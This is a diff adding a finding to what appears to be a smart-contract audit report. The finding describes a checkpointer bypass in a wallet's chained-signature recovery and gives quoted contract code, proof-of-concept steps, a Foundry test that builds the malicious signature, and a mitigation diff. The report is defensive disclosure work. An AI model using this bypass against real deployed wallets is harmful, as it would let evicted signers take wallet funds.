@@ -139,6 +139,175 @@ contract ReplaySignature is ExtendedSessionTestBase {
    
 3. Consider adding a second-level check in `SessionManager` that rejects signatures whose imageHash was not issued specifically for the calling wallet, rather than only verifying the recovered session signer.
 
+### [H-2] Checkpointer Bypass Via Chained Signature Allows Evicted Signers to Maintain Wallet Access
+
+**Description** Consider a scenario where the top level signature flag is set to chained signature with no checkpointer bit set. In this case, the `recover` function in `BaseSig.sol` completely bypasses the checkpointer verification logic as for the chained signatures, `_ignoreCheckpointer` is set to true. Allowing attackers to:
+
+- Use stale wallet configurations where they still have signing authority
+- Wrap these signatures in chained signatures with the "no checkpointer" flag set
+- Completely bypass the checkpointer's replay protection mechanism
+- Maintain access to the wallet even after being evicted from the current configuration
+
+```solidity
+  if (signatureFlag & 0x40 == 0x40 && _checkpointer == address(0)) {
+      // Override the checkpointer
+      // not ideal, but we don't have much room in the stack
+      (_checkpointer, rindex) = _signature.readAddress(rindex);
+
+      if (!_ignoreCheckpointer) {
+        // Next 3 bytes determine the checkpointer data size
+        uint256 checkpointerDataSize;
+        (checkpointerDataSize, rindex) = _signature.readUint24(rindex);
+
+        // Read the checkpointer data
+        bytes memory checkpointerData = _signature[rindex:rindex + checkpointerDataSize];
+
+        // Call the middleware
+        snapshot = ICheckpointer(_checkpointer).snapshotFor(address(this), checkpointerData); //imageHash, checkpoint
+
+        rindex += checkpointerDataSize;
+      }
+    }
+```
+
+Based on the above code snippet from `BaseSig.sol`, when the signature flag indicates a chained signature (0x40) and no checkpointer is provided, the if block is ignored entirely, leaving the following variables uninitialized:
+- `_checkpointer`: remains as address(0)
+- `snapshot.imageHash`: remains as bytes32(0)
+- `snapshot.checkpoint`: remains as uint256(0)
+
+```solidity
+  function recoverChained(
+    Payload.Decoded memory _payload,
+    address _checkpointer,
+    Snapshot memory _snapshot,
+    bytes calldata _signature
+  ) internal view returns (uint256 threshold, uint256 weight, bytes32 imageHash, uint256 checkpoint, bytes32 opHash) {
+    Payload.Decoded memory linkedPayload;
+    linkedPayload.kind = Payload.KIND_CONFIG_UPDATE;
+
+    uint256 rindex;
+    uint256 prevCheckpoint = type(uint256).max;
+
+    while (rindex < _signature.length) {
+      uint256 nrindex;
+
+      {
+        uint256 sigSize;
+        (sigSize, rindex) = _signature.readUint24(rindex);
+        nrindex = sigSize + rindex;
+      }
+
+      address checkpointer = nrindex == _signature.length ? _checkpointer : address(0);
+
+      if (prevCheckpoint == type(uint256).max) {
+        (threshold, weight, imageHash, checkpoint, opHash) =
+          recover(_payload, _signature[rindex:nrindex], true, checkpointer);
+      } else {
+        // [...]
+      }
+
+     // [...]
+```
+In the above code snippet, if the chained signature contains only one signature segment (i.e., `nrindex == _signature.length`), the `_checkpointer` variable (which is address(0)) is passed to the `recover` function.
+
+It enters the `recover` again and this allows the attacker to bypass the checkpointer verification logic completely, as the subsequent code for traversing the rest of the chained signature is skipped due to the `_ignoreCheckpointer` flag being set to true.
+
+The function then returns successfully, due to this part of code as `snapshot.imageHash == 0` because checkpointer verification was skipped:
+
+```solidity
+  if (snapshot.imageHash != bytes32(0) && snapshot.imageHash != imageHash && checkpoint <= snapshot.checkpoint) {
+    revert UnusedSnapshot(snapshot);
+  }
+```
+After all this the signature recovery doesn't revert and returns an image hash which is valid for the wallet's current configuration. The checkpointer has been ignored completely which could have been ahead of wallet configuration and pointing to latest configuration.
+
+**Impact** An evicted signer can maliciously sign a payload (valid with respect to the stale wallet configuration) and perform operations on the wallet.
+
+**Proof of Concepts**
+
+1. Create a wallet configuration where Alice is a signer.
+2. Update the wallet configuration to evict Alice and add Bob as a signer, with the checkpointer pointing to this new configuration.
+3. Alice signs a transaction payload valid under the old configuration.
+4. Transaction is wrapped in a chained signature with the "no checkpointer" flag set.
+5. The signature goes through successfully, allowing Alice to execute the transaction despite being evicted.
+
+Paste the following test case in `BaseSig.t.sol`
+<details>
+<summary>Proof Of Code</summary>
+
+```solidity
+  function test_Checkpointer_Bypass() external {
+    address checkpointerAddress = makeAddr("check pointer");
+
+    (address alice, uint256 aliceKey) = makeAddrAndKey("alice");
+    (address bob,) = makeAddrAndKey("bob");
+    Payload.Decoded memory payload;
+    uint256 checkpoint1 = 1;
+    uint16 threshold1 = 1;
+    uint256 checkpoint2 = 2;
+    uint16 threshold2 = 1;
+
+    // Let's assume config1 is currently where the wallet contract is at, while the checkpointer is ahead at config2
+    string memory config1 = PrimitivesRPC.newConfigWithCheckpointer(
+      vm, checkpointerAddress, threshold1, checkpoint1, string(abi.encodePacked("signer:", vm.toString(alice), ":1"))
+    );
+    // In config2 Alice is no longer a signer so she shouldn't be able to authorise any more transactions
+    string memory config2 = PrimitivesRPC.newConfigWithCheckpointer(
+      vm, checkpointerAddress, threshold2, checkpoint2, string(abi.encodePacked("signer:", vm.toString(bob), ":2"))
+    );
+    payload.kind = Payload.KIND_TRANSACTIONS;
+    payload.kind = Payload.KIND_TRANSACTIONS;
+    payload.calls = new Payload.Call[](1);
+    payload.calls[0] = Payload.Call({
+      to: address(0x123),
+      value: 0,
+      data: "",
+      gasLimit: 100000,
+      delegateCall: false,
+      onlyFallback: false,
+      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
+    });
+
+    Snapshot memory latestSnapshot = Snapshot(PrimitivesRPC.getImageHash(vm, config2), 2);
+
+    (uint8 v, bytes32 r, bytes32 s) = vm.sign(aliceKey, Payload.hashFor(payload, address(baseSigImp)));
+
+    string memory se =
+      string(abi.encodePacked(vm.toString(alice), ":hash:", vm.toString(r), ":", vm.toString(s), ":", vm.toString(v)));
+
+    bytes memory innerSignature = PrimitivesRPC.toEncodedSignature(vm, config1, se, true);
+
+    bytes memory maliciousSignature = abi.encodePacked(
+      bytes1(0x05), // Outer: chained + no checkpointer
+      bytes3(uint24(innerSignature.length)), // Length of inner signature
+      innerSignature // Signature that SHOULD require checkpointer but won't be validated
+    );
+
+    // Mock checkpointer to return latest state
+    vm.mockCall(
+      checkpointerAddress, abi.encodeWithSelector(ICheckpointer.snapshotFor.selector), abi.encode(latestSnapshot)
+    );
+
+    (uint256 threshold, uint256 weight, bytes32 imageHash, uint256 checkpoint,) =
+      baseSigImp.recoverPub(payload, maliciousSignature, true, address(0));
+
+    assertGe(weight, threshold, "Weight must at least reach threshold");
+  }
+```
+</details>
+
+**Recommended mitigation** Do not permit the checkpointer to be disabled in the signature (bit 6 left unset) if a chained signature is used. The signature recovery should revert in this case. For example, create a new custom error for this and add it here:
+
+```diff
+     // If signature type is 01 or 11 we do a chained signature
+     if (signatureFlag & 0x01 == 0x01) {
++      if (signatureFlag & 0x40 == 0) {
++        revert MissingCheckpointer();
++      }
+       return recoverChained(_payload, _checkpointer, snapshot, _signature[rindex:]);
+     }
+```
+
 ### [M-1] Relayer can escalate privileges by swapping unsigned call flag in `recoverSignature` of `SessionSig.sol`
 
 **Description** The session system's call signatures do not cryptographically bind to the specific permission or attestation being used for validation. The hashCallWithReplayProtection() function computes signature digests using only call parameters and replay protection fields, excluding the permission/attestation selection flag byte. 
